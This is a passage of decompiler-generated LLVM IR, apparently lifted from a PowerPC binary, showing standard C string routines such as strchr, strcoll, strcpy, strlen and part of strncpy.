  %v3_10009ce4 = phi i32 [ %v4_10009ce4, %dec_label_pc_10009ce4 ], [ %v1_10009ce0, %dec_label_pc_10009cd4 ]
  %v4_10009ce4 = add i32 %v3_10009ce4, 1
  %v5_10009ce4 = inttoptr i32 %v4_10009ce4 to i8*
  store i8 %v2_10009c98, i8* %v5_10009ce4, align 1
  store i32 %v4_10009ce4, i32* %r9.global-to-local, align 4
  %v0_10009ce8 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10009ce8 = add i32 %v0_10009ce8, -1
  store i32 %v1_10009ce8, i32* %ctr.global-to-local, align 4
  %v2_10009ce8 = icmp eq i32 %v1_10009ce8, 0
  br i1 %v2_10009ce8, label %dec_label_pc_10009d14, label %dec_label_pc_10009ce4

dec_label_pc_10009cf0:                            ; preds = %dec_label_pc_10009ca0
  %v1_10009cf0 = sub nsw i32 4, %v1_10009ca0
  store i32 %v1_10009cf0, i32* %ctr.global-to-local, align 4
  %v1_10009cf8 = load i32, i32* %r5.global-to-local, align 4
  %v2_10009cf8 = sub i32 %v1_10009cf8, %v1_10009cf0
  store i32 %v2_10009cf8, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10009cfc

dec_label_pc_10009cfc:                            ; preds = %dec_label_pc_10009cfc, %dec_label_pc_10009cf0
  %v3_10009cfc = phi i32 [ %v1_10009d00, %dec_label_pc_10009cfc ], [ %v0_10009ca0, %dec_label_pc_10009cf0 ]
  %v4_10009cfc = add i32 %v3_10009cfc, 4
  %v5_10009cfc = inttoptr i32 %v4_10009cfc to i8*
  store i8 %v2_10009c98, i8* %v5_10009cfc, align 1
  %v0_10009d00 = load i32, i32* %r11.global-to-local, align 4
  %v1_10009d00 = add i32 %v0_10009d00, 1
  store i32 %v1_10009d00, i32* %r11.global-to-local, align 4
  %v0_10009d04 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10009d04 = add i32 %v0_10009d04, -1
  store i32 %v1_10009d04, i32* %ctr.global-to-local, align 4
  %v2_10009d04 = icmp eq i32 %v1_10009d04, 0
  br i1 %v2_10009d04, label %dec_label_pc_10009d08, label %dec_label_pc_10009cfc

dec_label_pc_10009d08:                            ; preds = %dec_label_pc_10009cfc
  %v0_10009d08 = load i32, i32* %r5.global-to-local, align 4
  %v1_10009d08 = call i32 @__asm_rlwinm.(i32 %v0_10009d08, i32 29, i32 3, i32 31)
  store i32 %v1_10009d08, i32* %r9.global-to-local, align 4
  %v4_10009d08 = icmp eq i32 %v1_10009d08, 0
  store i1 %v4_10009d08, i1* %cr0_eq.global-to-local, align 1
  store i1 false, i1* @cr0_so, align 1
  br i1 %v4_10009d08, label %dec_label_pc_10009cc0, label %dec_label_pc_10009d08.dec_label_pc_10009ca8_crit_edge

dec_label_pc_10009d08.dec_label_pc_10009ca8_crit_edge: ; preds = %dec_label_pc_10009d08
  %v0_10009cac.pre.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10009ca8

dec_label_pc_10009d14:                            ; preds = %dec_label_pc_10009ce4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_10009d08, { 1, 2, 0 }
  uselistorder i32 %v1_10009d04, { 1, 0 }
  uselistorder i32 %v1_10009d00, { 1, 0 }
  uselistorder i32 %v1_10009ce8, { 1, 0 }
  uselistorder i32 %v4_10009ce4, { 1, 2, 0 }
  uselistorder i32 %v1_10009cc0, { 2, 1, 0 }
  uselistorder i32 %v1_10009cbc, { 1, 0 }
  uselistorder i32 %v1_10009cb8, { 1, 0 }
  uselistorder i32 %v1_10009ca0, { 1, 0 }
  uselistorder i32 %v0_10009ca0, { 2, 1, 0 }
  uselistorder i8 %v2_10009c98, { 3, 1, 2, 0 }
  uselistorder i32* %r5.global-to-local, { 2, 4, 0, 3, 1 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 4, 5, 2, 6, 3, 7, 8 }
  uselistorder i32 (i32, i32, i32, i32)* @__asm_rlwimi, { 3, 4, 0, 1, 2 }
  uselistorder i1* @cr0_so, { 2, 3, 4, 0, 1 }
  uselistorder label %dec_label_pc_10009cd4, { 1, 0 }
  uselistorder label %dec_label_pc_10009cc0, { 1, 0, 2 }
}

define i32 @__GI_strchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %v1_10009d18 = urem i32 %arg1, 256
  store i32 %v1_10009d18, i32* %r4.global-to-local, align 4
  %v0_10009d382 = load i32, i32* @r3, align 4
  %v1_10009d383 = urem i32 %v0_10009d382, 4
  %v3_10009d385 = icmp eq i32 %v1_10009d383, 0
  br i1 %v3_10009d385, label %dec_label_pc_10009d40, label %dec_label_pc_10009d20

dec_label_pc_10009d20:                            ; preds = %entry, %dec_label_pc_10009d34
  %v1_10009d24 = phi i32 [ %v0_10009d40.pre, %dec_label_pc_10009d34 ], [ %v1_10009d18, %entry ]
  %v0_10009d20 = phi i32 [ %v1_10009d34, %dec_label_pc_10009d34 ], [ %v0_10009d382, %entry ]
  %v1_10009d20 = inttoptr i32 %v0_10009d20 to i8*
  %v2_10009d20 = load i8, i8* %v1_10009d20, align 1
  %v3_10009d20 = zext i8 %v2_10009d20 to i32
  %v4_10009d24 = icmp eq i32 %v3_10009d20, %v1_10009d24
  %v3_10009d28 = icmp eq i8 %v2_10009d20, 0
  %v0_10009d2c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_10009d24, i32 %v0_10009d2c)
  br i1 %v3_10009d28, label %dec_label_pc_10009e10, label %dec_label_pc_10009d34

dec_label_pc_10009d34:                            ; preds = %dec_label_pc_10009d20
  %v0_10009d34 = load i32, i32* @r3, align 4
  %v1_10009d34 = add i32 %v0_10009d34, 1
  store i32 %v1_10009d34, i32* @r3, align 4
  %v1_10009d38 = urem i32 %v1_10009d34, 4
  %v3_10009d38 = icmp eq i32 %v1_10009d38, 0
  %v0_10009d40.pre = load i32, i32* %r4.global-to-local, align 4
  br i1 %v3_10009d38, label %dec_label_pc_10009d40, label %dec_label_pc_10009d20

dec_label_pc_10009d40:                            ; preds = %dec_label_pc_10009d34, %entry
  %v0_10009d5810 = phi i32 [ %v0_10009d382, %entry ], [ %v1_10009d34, %dec_label_pc_10009d34 ]
  %v0_10009d40 = phi i32 [ %v1_10009d18, %entry ], [ %v0_10009d40.pre, %dec_label_pc_10009d34 ]
  %v1_10009d40 = mul i32 %v0_10009d40, 256
  %v2_10009d48 = or i32 %v1_10009d40, %v0_10009d40
  %v1_10009d50 = mul i32 %v2_10009d48, 65536
  %v2_10009d54 = or i32 %v1_10009d50, %v2_10009d48
  br label %dec_label_pc_10009d58

dec_label_pc_10009d58:                            ; preds = %dec_label_pc_10009d58, %dec_label_pc_10009e0c, %dec_label_pc_10009d40
  %v0_10009db0 = phi i32 [ %v0_10009d5810, %dec_label_pc_10009d40 ], [ %v1_10009d5c, %dec_label_pc_10009e0c ], [ %v1_10009d5c, %dec_label_pc_10009d58 ]
  %v1_10009d58 = inttoptr i32 %v0_10009db0 to i32*
  %v2_10009d58 = load i32, i32* %v1_10009d58, align 4
  %v1_10009d5c = add i32 %v0_10009db0, 4
  %v2_10009d64 = xor i32 %v2_10009d58, %v2_10009d54
  %v1_10009d68 = add i32 %v2_10009d58, 2130640639
  %v2_10009d70 = xor i32 %v1_10009d68, %v2_10009d58
  %v1_10009d74 = add i32 %v2_10009d64, 2130640639
  %v2_10009d78 = and i32 %v2_10009d70, -2130640640
  %v3_10009d78 = xor i32 %v2_10009d78, -2130640640
  %v2_10009d7c = xor i32 %v1_10009d74, %v2_10009d64
  %v2_10009d80 = and i32 %v2_10009d7c, -2130640640
  %v3_10009d80 = xor i32 %v2_10009d80, -2130640640
  %v1_10009d8c = add i32 %v0_10009db0, 1
  %tmp = or i32 %v3_10009d80, %v3_10009d78
  %brmerge = icmp eq i32 %tmp, 0
  br i1 %brmerge, label %dec_label_pc_10009d58, label %dec_label_pc_10009d98

dec_label_pc_10009d98:                            ; preds = %dec_label_pc_10009d58
  %v2_10009d98 = inttoptr i32 %v0_10009db0 to i8*
  %v3_10009d98 = load i8, i8* %v2_10009d98, align 1
  %v4_10009d98 = zext i8 %v3_10009d98 to i32
  %v1_10009d9c = add i32 %v0_10009db0, 2
  %v1_10009da0 = add i32 %v0_10009db0, 3
  %v4_10009da4 = icmp eq i32 %v4_10009d98, %v0_10009d40
  br i1 %v4_10009da4, label %dec_label_pc_10009db0, label %dec_label_pc_10009db8

dec_label_pc_10009db0:                            ; preds = %dec_label_pc_10009d98
  ret i32 %v0_10009db0

dec_label_pc_10009db8:                            ; preds = %dec_label_pc_10009d98
  %v3_10009da8 = icmp eq i8 %v3_10009d98, 0
  br i1 %v3_10009da8, label %dec_label_pc_10009e10, label %dec_label_pc_10009dbc

dec_label_pc_10009dbc:                            ; preds = %dec_label_pc_10009db8
  %v2_10009dbc = inttoptr i32 %v1_10009d8c to i8*
  %v3_10009dbc = load i8, i8* %v2_10009dbc, align 1
  %v4_10009dbc = zext i8 %v3_10009dbc to i32
  %v4_10009dc0 = icmp eq i32 %v4_10009dbc, %v0_10009d40
  br i1 %v4_10009dc0, label %dec_label_pc_10009dcc, label %dec_label_pc_10009dd4

dec_label_pc_10009dcc:                            ; preds = %dec_label_pc_10009dbc
  ret i32 %v1_10009d8c

dec_label_pc_10009dd4:                            ; preds = %dec_label_pc_10009dbc
  %v3_10009dc4 = icmp eq i8 %v3_10009dbc, 0
  br i1 %v3_10009dc4, label %dec_label_pc_10009e10, label %dec_label_pc_10009dd8

dec_label_pc_10009dd8:                            ; preds = %dec_label_pc_10009dd4
  %v2_10009dd8 = inttoptr i32 %v1_10009d9c to i8*
  %v3_10009dd8 = load i8, i8* %v2_10009dd8, align 1
  %v4_10009dd8 = zext i8 %v3_10009dd8 to i32
  %v4_10009ddc = icmp eq i32 %v4_10009dd8, %v0_10009d40
  br i1 %v4_10009ddc, label %dec_label_pc_10009de8, label %dec_label_pc_10009df0

dec_label_pc_10009de8:                            ; preds = %dec_label_pc_10009dd8
  ret i32 %v1_10009d9c

dec_label_pc_10009df0:                            ; preds = %dec_label_pc_10009dd8
  %v3_10009de0 = icmp eq i8 %v3_10009dd8, 0
  br i1 %v3_10009de0, label %dec_label_pc_10009e10, label %dec_label_pc_10009df4

dec_label_pc_10009df4:                            ; preds = %dec_label_pc_10009df0
  %v2_10009df4 = inttoptr i32 %v1_10009da0 to i8*
  %v3_10009df4 = load i8, i8* %v2_10009df4, align 1
  %v4_10009df4 = zext i8 %v3_10009df4 to i32
  %v4_10009df8 = icmp eq i32 %v4_10009df4, %v0_10009d40
  br i1 %v4_10009df8, label %dec_label_pc_10009e04, label %dec_label_pc_10009e0c

dec_label_pc_10009e04:                            ; preds = %dec_label_pc_10009df4
  ret i32 %v1_10009da0

dec_label_pc_10009e0c:                            ; preds = %dec_label_pc_10009df4
  %v3_10009dfc = icmp eq i8 %v3_10009df4, 0
  br i1 %v3_10009dfc, label %dec_label_pc_10009e10, label %dec_label_pc_10009d58

dec_label_pc_10009e10:                            ; preds = %dec_label_pc_10009d20, %dec_label_pc_10009e0c, %dec_label_pc_10009df0, %dec_label_pc_10009dd4, %dec_label_pc_10009db8
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_10009d5c, { 1, 0 }
  uselistorder i32 %v2_10009d58, { 0, 2, 1 }
  uselistorder i32 %v0_10009db0, { 0, 1, 2, 4, 3, 6, 5 }
  uselistorder i32 %v2_10009d48, { 1, 0 }
  uselistorder i32 %v0_10009d40, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_10009d34, { 1, 0, 3, 2 }
  uselistorder i32 %v0_10009d382, { 2, 1, 0 }
  uselistorder i32 %v1_10009d18, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10009e10, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_10009d58, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10009d20, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_10009e24.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_10009e1c

dec_label_pc_10009e1c:                            ; preds = %dec_label_pc_10009e40, %entry
  %v0_10009e24 = phi i32 [ %v1_10009e28, %dec_label_pc_10009e40 ], [ %v0_10009e24.pre, %entry ]
  %v0_10009e1c = phi i32 [ %v1_10009e20, %dec_label_pc_10009e40 ], [ %tmp, %entry ]
  %v1_10009e1c = inttoptr i32 %v0_10009e1c to i8*
  %v2_10009e1c = load i8, i8* %v1_10009e1c, align 1
  %v3_10009e1c = zext i8 %v2_10009e1c to i32
  %v1_10009e24 = inttoptr i32 %v0_10009e24 to i8*
  %v2_10009e24 = load i8, i8* %v1_10009e24, align 1
  %v3_10009e24 = zext i8 %v2_10009e24 to i32
  %v3_10009e2c = icmp eq i8 %v2_10009e1c, 0
  br i1 %v3_10009e2c, label %dec_label_pc_10009e38, label %dec_label_pc_10009e40

dec_label_pc_10009e38:                            ; preds = %dec_label_pc_10009e1c
  %v1_10009e38 = sub nsw i32 0, %v3_10009e24
  ret i32 %v1_10009e38

dec_label_pc_10009e40:                            ; preds = %dec_label_pc_10009e1c
  %v4_10009e30 = icmp eq i8 %v2_10009e1c, %v2_10009e24
  %v1_10009e28 = add i32 %v0_10009e24, 1
  %v1_10009e20 = add i32 %v0_10009e1c, 1
  br i1 %v4_10009e30, label %dec_label_pc_10009e1c, label %dec_label_pc_10009e44

dec_label_pc_10009e44:                            ; preds = %dec_label_pc_10009e40
  %v2_10009e44 = sub nsw i32 %v3_10009e1c, %v3_10009e24
  ret i32 %v2_10009e44

; uselistorder directives
  uselistorder i32 %v3_10009e24, { 1, 0 }
  uselistorder i32 %v0_10009e1c, { 1, 0 }
  uselistorder i32 %v0_10009e24, { 1, 0 }
}

define i32 @strcpy(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %r4.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* %r4.global-to-local, align 4
  %v2_10009e4c = add i32 %arg1, -1
  %v1_10009e50 = sub i32 %v2_10009e4c, %tmp
  store i32 %v1_10009e50, i32* %r9.global-to-local, align 4
  %v2_10009e544 = load i8, i8* %arg2, align 1
  %v1_10009e586 = add i32 %tmp, 1
  store i32 %v1_10009e586, i32* %r4.global-to-local, align 4
  %v3_10009e5c8 = icmp eq i8 %v2_10009e544, 0
  store i1 %v3_10009e5c8, i1* %cr7_eq.global-to-local, align 1
  %v5_10009e609 = inttoptr i32 %arg1 to i8*
  store i8 %v2_10009e544, i8* %v5_10009e609, align 1
  %v0_10009e6410 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10009e6410, label %dec_label_pc_10009e68, label %dec_label_pc_10009e54.dec_label_pc_10009e54_crit_edge

dec_label_pc_10009e54.dec_label_pc_10009e54_crit_edge: ; preds = %entry, %dec_label_pc_10009e54.dec_label_pc_10009e54_crit_edge
  %v0_10009e54.pre = load i32, i32* %r4.global-to-local, align 4
  %v2_10009e60.pre = load i32, i32* %r9.global-to-local, align 4
  %v1_10009e54 = inttoptr i32 %v0_10009e54.pre to i8*
  %v2_10009e54 = load i8, i8* %v1_10009e54, align 1
  %v1_10009e58 = add i32 %v0_10009e54.pre, 1
  store i32 %v1_10009e58, i32* %r4.global-to-local, align 4
  %v3_10009e5c = icmp eq i8 %v2_10009e54, 0
  store i1 %v3_10009e5c, i1* %cr7_eq.global-to-local, align 1
  %v4_10009e60 = add i32 %v1_10009e58, %v2_10009e60.pre
  %v5_10009e60 = inttoptr i32 %v4_10009e60 to i8*
  store i8 %v2_10009e54, i8* %v5_10009e60, align 1
  %v0_10009e64 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10009e64, label %dec_label_pc_10009e68, label %dec_label_pc_10009e54.dec_label_pc_10009e54_crit_edge

dec_label_pc_10009e68:                            ; preds = %dec_label_pc_10009e54.dec_label_pc_10009e54_crit_edge, %entry
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 3, 2, 1, 0 }
  uselistorder i1* %cr7_eq.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10009e54.dec_label_pc_10009e54_crit_edge, { 1, 0 }
}

define i32 @__GI_strlen() local_unnamed_addr {
entry:
  %v0_10009e6c = load i32, i32* @r3, align 4
  %v1_10009e843 = urem i32 %v0_10009e6c, 4
  %v3_10009e845 = icmp eq i32 %v1_10009e843, 0
  br i1 %v3_10009e845, label %dec_label_pc_10009e8c, label %dec_label_pc_10009e74

dec_label_pc_10009e74:                            ; preds = %entry, %dec_label_pc_10009e80
  %v0_10009e80 = phi i32 [ %v1_10009e80, %dec_label_pc_10009e80 ], [ %v0_10009e6c, %entry ]
  %v1_10009e74 = inttoptr i32 %v0_10009e80 to i8*
  %v2_10009e74 = load i8, i8* %v1_10009e74, align 1
  %v3_10009e78 = icmp eq i8 %v2_10009e74, 0
  br i1 %v3_10009e78, label %dec_label_pc_10009ec0, label %dec_label_pc_10009e80

dec_label_pc_10009e80:                            ; preds = %dec_label_pc_10009e74
  %v1_10009e80 = add i32 %v0_10009e80, 1
  %v1_10009e84 = urem i32 %v1_10009e80, 4
  %v3_10009e84 = icmp eq i32 %v1_10009e84, 0
  br i1 %v3_10009e84, label %dec_label_pc_10009e8c, label %dec_label_pc_10009e74

dec_label_pc_10009e8c:                            ; preds = %dec_label_pc_10009e80, %entry
  %v0_10009e90 = phi i32 [ %v0_10009e6c, %entry ], [ %v1_10009e80, %dec_label_pc_10009e80 ]
  store i32 -2139062144, i32* @r8, align 4
  br label %dec_label_pc_10009e98

dec_label_pc_10009e98:                            ; preds = %dec_label_pc_10009ef8, %dec_label_pc_10009e98, %dec_label_pc_10009e8c
  %v1_10009ed4 = phi i32 [ %v0_10009e90, %dec_label_pc_10009e8c ], [ %v1_10009e9c, %dec_label_pc_10009e98 ], [ %v1_10009e9c, %dec_label_pc_10009ef8 ]
  %v1_10009e98 = inttoptr i32 %v1_10009ed4 to i32*
  %v2_10009e98 = load i32, i32* %v1_10009e98, align 4
  %v1_10009e9c = add i32 %v1_10009ed4, 4
  %v1_10009ea8 = add i32 %v2_10009e98, -16843009
  %v2_10009eac = and i32 %v1_10009ea8, -2139062144
  %v5_10009eac = icmp eq i32 %v2_10009eac, 0
  br i1 %v5_10009eac, label %dec_label_pc_10009e98, label %dec_label_pc_10009eb4

dec_label_pc_10009eb4:                            ; preds = %dec_label_pc_10009e98
  %v2_10009eb4 = inttoptr i32 %v1_10009ed4 to i8*
  %v3_10009eb4 = load i8, i8* %v2_10009eb4, align 1
  %v3_10009eb8 = icmp eq i8 %v3_10009eb4, 0
  br i1 %v3_10009eb8, label %dec_label_pc_10009ec0, label %dec_label_pc_10009ec8

dec_label_pc_10009ec0:                            ; preds = %dec_label_pc_10009e74, %dec_label_pc_10009eb4
  %v1_10009ec0 = phi i32 [ %v1_10009ed4, %dec_label_pc_10009eb4 ], [ %v0_10009e80, %dec_label_pc_10009e74 ]
  %v2_10009ec0 = sub i32 %v1_10009ec0, %v0_10009e6c
  ret i32 %v2_10009ec0

dec_label_pc_10009ec8:                            ; preds = %dec_label_pc_10009eb4
  %v1_10009ec8 = add i32 %v1_10009ed4, 1
  %v2_10009ec8 = inttoptr i32 %v1_10009ec8 to i8*
  %v3_10009ec8 = load i8, i8* %v2_10009ec8, align 1
  %v3_10009ecc = icmp eq i8 %v3_10009ec8, 0
  br i1 %v3_10009ecc, label %dec_label_pc_10009ed4, label %dec_label_pc_10009ee0

dec_label_pc_10009ed4:                            ; preds = %dec_label_pc_10009ec8
  %v2_10009ed4 = sub i32 %v1_10009ed4, %v0_10009e6c
  %v1_10009ed8 = add i32 %v2_10009ed4, 1
  ret i32 %v1_10009ed8

dec_label_pc_10009ee0:                            ; preds = %dec_label_pc_10009ec8
  %v1_10009ee0 = add i32 %v1_10009ed4, 2
  %v2_10009ee0 = inttoptr i32 %v1_10009ee0 to i8*
  %v3_10009ee0 = load i8, i8* %v2_10009ee0, align 1
  %v3_10009ee4 = icmp eq i8 %v3_10009ee0, 0
  br i1 %v3_10009ee4, label %dec_label_pc_10009eec, label %dec_label_pc_10009ef8

dec_label_pc_10009eec:                            ; preds = %dec_label_pc_10009ee0
  %v2_10009eec = sub i32 %v1_10009ed4, %v0_10009e6c
  %v1_10009ef0 = add i32 %v2_10009eec, 2
  ret i32 %v1_10009ef0

dec_label_pc_10009ef8:                            ; preds = %dec_label_pc_10009ee0
  %v1_10009ef8 = add i32 %v1_10009ed4, 3
  %v2_10009ef8 = inttoptr i32 %v1_10009ef8 to i8*
  %v3_10009ef8 = load i8, i8* %v2_10009ef8, align 1
  %v3_10009efc = icmp eq i8 %v3_10009ef8, 0
  br i1 %v3_10009efc, label %dec_label_pc_10009f04, label %dec_label_pc_10009e98

dec_label_pc_10009f04:                            ; preds = %dec_label_pc_10009ef8
  %v2_10009f04 = sub i32 %v1_10009ed4, %v0_10009e6c
  %v1_10009f08 = add i32 %v2_10009f04, 3
  ret i32 %v1_10009f08

; uselistorder directives
  uselistorder i32 %v1_10009e9c, { 1, 0 }
  uselistorder i32 %v1_10009ed4, { 3, 4, 2, 5, 1, 6, 0, 7, 9, 8 }
  uselistorder i32 %v1_10009e80, { 1, 0, 2 }
  uselistorder i32 %v0_10009e6c, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10009ec0, { 1, 0 }
  uselistorder label %dec_label_pc_10009e74, { 1, 0 }
}

define i32 @strncpy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v3_10009f10 = icmp eq i32 %arg2, 3
  store i1 %v3_10009f10, i1* %cr7_eq.global-to-local, align 1
  %v1_10009f14 = add i32 %arg1, -1
  store i32 %v1_10009f14, i32* %r11.global-to-local, align 4
  %tmp = icmp ult i32 %arg2, 4
  br i1 %tmp, label %dec_label_pc_10009f90, label %dec_label_pc_10009f1c

dec_label_pc_10009f1c:                            ; preds = %entry
  %v1_10009f1c = udiv i32 %arg2, 4
  store i32 %v1_10009f1c, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10009f24

dec_label_pc_10009f24:                            ; preds = %dec_label_pc_10009f74, %dec_label_pc_10009f1c
  %v2_10009f34 = phi i32 [ %v3_10009f6c, %dec_label_pc_10009f74 ], [ %v1_10009f14, %dec_label_pc_10009f1c ]
  %v0_10009f24 = load i32, i32* @r4, align 4
  %v1_10009f24 = inttoptr i32 %v0_10009f24 to i8*
  %v2_10009f24 = load i8, i8* %v1_10009f24, align 1
  %v1_10009f28 = add i32 %v0_10009f24, 1
  store i32 %v1_10009f28, i32* %r10.global-to-local, align 4
  %v1_10009f2c = add i32 %v0_10009f24, 2
  store i32 %v1_10009f2c, i32* @r8, align 4
  %v3_10009f30 = icmp eq i8 %v2_10009f24, 0
  store i1 %v3_10009f30, i1* %cr7_eq.global-to-local, align 1
  %v3_10009f34 = add i32 %v2_10009f34, 1
  %v4_10009f34 = inttoptr i32 %v3_10009f34 to i8*
  store i8 %v2_10009f24, i8* %v4_10009f34, align 1
  store i32 %v3_10009f34, i32* %r11.global-to-local, align 4
  %v0_10009f38 = load i32, i32* @r8, align 4
  %v1_10009f38 = add i32 %v0_10009f38, 1
  store i32 %v1_10009f38, i32* %r9.global-to-local, align 4
  %v0_10009f3c = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10009f3c, label %dec_label_pc_10009f7c, label %dec_label_pc_10009f40

dec_label_pc_10009f40:                            ; preds = %dec_label_pc_10009f24
  %v0_10009f40 = load i32, i32* @r4, align 4
  %v1_10009f40 = add i32 %v0_10009f40, 1
  %v2_10009f40 = inttoptr i32 %v1_10009f40 to i8*
  %v3_10009f40 = load i8, i8* %v2_10009f40, align 1
  %v1_10009f44 = add i32 %v0_10009f38, 2
  store i32 %v1_10009f44, i32* @r4, align 4
  %v3_10009f48 = icmp eq i8 %v3_10009f40, 0
  store i1 %v3_10009f48, i1* %cr7_eq.global-to-local, align 1
  %v3_10009f4c = add i32 %v2_10009f34, 2
  %v4_10009f4c = inttoptr i32 %v3_10009f4c to i8*
  store i8 %v3_10009f40, i8* %v4_10009f4c, align 1
  store i32 %v3_10009f4c, i32* %r11.global-to-local, align 4
  %v0_10009f50 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10009f50, label %dec_label_pc_10009f7c, label %dec_label_pc_10009f54

dec_label_pc_10009f54:                            ; preds = %dec_label_pc_10009f40
  %v0_10009f54 = load i32, i32* %r10.global-to-local, align 4
  %v1_10009f54 = add i32 %v0_10009f54, 1
  %v2_10009f54 = inttoptr i32 %v1_10009f54 to i8*
  %v3_10009f54 = load i8, i8* %v2_10009f54, align 1
  %v3_10009f58 = icmp eq i8 %v3_10009f54, 0
  store i1 %v3_10009f58, i1* %cr7_eq.global-to-local, align 1
  %v3_10009f5c = add i32 %v2_10009f34, 3
  %v4_10009f5c = inttoptr i32 %v3_10009f5c to i8*
  store i8 %v3_10009f54, i8* %v4_10009f5c, align 1
  store i32 %v3_10009f5c, i32* %r11.global-to-local, align 4
  %v0_10009f60 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10009f60, label %dec_label_pc_10009f7c, label %dec_label_pc_10009f64

dec_label_pc_10009f64:                            ; preds = %dec_label_pc_10009f54
  %v0_10009f64 = load i32, i32* @r8, align 4
  %v1_10009f64 = add i32 %v0_10009f64, 1
  %v2_10009f64 = inttoptr i32 %v1_10009f64 to i8*
  %v3_10009f64 = load i8, i8* %v2_10009f64, align 1
  %v3_10009f68 = icmp eq i8 %v3_10009f64, 0
  store i1 %v3_10009f68, i1* %cr7_eq.global-to-local, align 1
  %v3_10009f6c = add i32 %v2_10009f34, 4
  %v4_10009f6c = inttoptr i32 %v3_10009f6c to i8*
  store i8 %v3_10009f64, i8* %v4_10009f6c, align 1
  store i32 %v3_10009f6c, i32* %r11.global-to-local, align 4
  %v0_10009f70 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10009f70, label %dec_label_pc_10009f7c, label %dec_label_pc_10009f74

dec_label_pc_10009f74:                            ; preds = %dec_label_pc_10009f64
  %v0_10009f74 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10009f74 = add i32 %v0_10009f74, -1
  store i32 %v1_10009f74, i32* %ctr.global-to-local, align 4
  %v2_10009f74 = icmp eq i32 %v1_10009f74, 0
  br i1 %v2_10009f74, label %dec_label_pc_10009f90, label %dec_label_pc_10009f24

dec_label_pc_10009f7c:                            ; preds = %dec_label_pc_10009f64, %dec_label_pc_10009f54, %dec_label_pc_10009f40, %dec_label_pc_10009f24
  %v1_10009f7c = phi i32 [ %v3_10009f6c, %dec_label_pc_10009f64 ], [ %v3_10009f5c, %dec_label_pc_10009f54 ], [ %v3_10009f4c, %dec_label_pc_10009f40 ], [ %v3_10009f34, %dec_label_pc_10009f24 ]
  %v2_10009f7c11 = sub i32 %arg1, %v1_10009f7c
  %v2_10009f80 = add i32 %v2_10009f7c11, %arg2
  %v1_10009f84 = add i32 %v2_10009f80, -1
  store i32 %v1_10009f84, i32* %r9.global-to-local, align 4
  %v4_10009f84 = icmp eq i32 %v1_10009f84, 0
  %v0_10009f88 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_10009f84, i32 %v0_10009f88)
  %v2_10009fc0.pre.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10009fb8

dec_label_pc_10009f90:                            ; preds = %dec_label_pc_10009f74, %entry
  %v1_10009f90 = urem i32 %arg2, 4
  store i32 %v1_10009f90, i32* %r9.global-to-local, align 4
  %v3_10009f90 = icmp eq i32 %v1_10009f90, 0
  %v0_10009f94 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10009f90, i32 %v0_10009f94)
  store i32 %v1_10009f90, i32* %ctr.global-to-local, align 4
  %v2_10009fac.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10009f9c

dec_label_pc_10009f9c:                            ; preds = %dec_label_pc_10009fb4.dec_label_pc_10009f9c_crit_edge, %dec_label_pc_10009f90
  %v2_10009fac = phi i32 [ %v3_10009fac, %dec_label_pc_10009fb4.dec_label_pc_10009f9c_crit_edge ], [ %v2_10009fac.pre, %dec_label_pc_10009f90 ]
  %v0_10009fa0 = phi i32 [ %v0_10009fa0.pre, %dec_label_pc_10009fb4.dec_label_pc_10009f9c_crit_edge ], [ %v1_10009f90, %dec_label_pc_10009f90 ]
  %v0_10009f9c = load i32, i32* @r4, align 4
  %v1_10009f9c = inttoptr i32 %v0_10009f9c to i8*
  %v2_10009f9c = load i8, i8* %v1_10009f9c, align 1
  %v1_10009fa0 = add i32 %v0_10009fa0, -1
  store i32 %v1_10009fa0, i32* %r9.global-to-local, align 4
  %v1_10009fa4 = add i32 %v0_10009f9c, 1
  store i32 %v1_10009fa4, i32* @r4, align 4
  %v3_10009fa8 = icmp eq i8 %v2_10009f9c, 0
  store i1 %v3_10009fa8, i1* %cr7_eq.global-to-local, align 1
  %v3_10009fac = add i32 %v2_10009fac, 1
  %v4_10009fac = inttoptr i32 %v3_10009fac to i8*
  store i8 %v2_10009f9c, i8* %v4_10009fac, align 1
